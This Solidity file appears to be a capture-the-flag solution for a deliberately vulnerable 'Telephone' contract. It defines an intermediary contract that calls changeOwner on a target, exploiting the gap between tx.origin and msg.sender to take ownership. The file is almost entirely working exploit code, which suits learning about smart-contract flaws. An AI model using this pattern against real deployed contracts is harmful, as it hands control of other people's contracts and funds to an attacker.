// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Use interface of original contract.
interface ITelephone {
    function changeOwner(address _owner) external;
}

// Tx.origin will be one who calls the ownership function in MyContract.
// Msg.sender will be the MyContract address. Because it sends tx to the original contract.

contract MyContract {

    address targetAddress;

    constructor(address _targetAddress) {
        targetAddress = _targetAddress;
    }

    function ownership(address _owner) public {
        ITelephone(targetAddress).changeOwner(_owner);
    }
}
